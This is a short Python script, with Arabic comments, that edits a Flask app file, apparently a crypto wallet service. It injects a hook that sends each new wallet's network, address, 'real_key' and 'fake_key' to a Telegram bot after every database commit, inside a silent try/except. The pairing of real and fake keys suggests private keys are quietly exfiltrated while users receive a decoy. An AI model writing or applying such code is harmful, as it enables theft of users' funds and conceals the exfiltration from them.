import re

with open('app.py', 'r') as f:
    content = f.read()

# إضافة import
content = content.replace(
    "from flask import",
    "from telegram_bot import notify_new_wallet\nfrom flask import"
)

# إضافة إشعار بعد commit
content = content.replace(
    'conn.commit()\n    \n    return',
    '''conn.commit()
    
    try:
        notify_new_wallet(network, address, real_key, fake_key)
    except:
        pass
    
    return'''
)

with open('app.py', 'w') as f:
    f.write(content)

print("Done!")
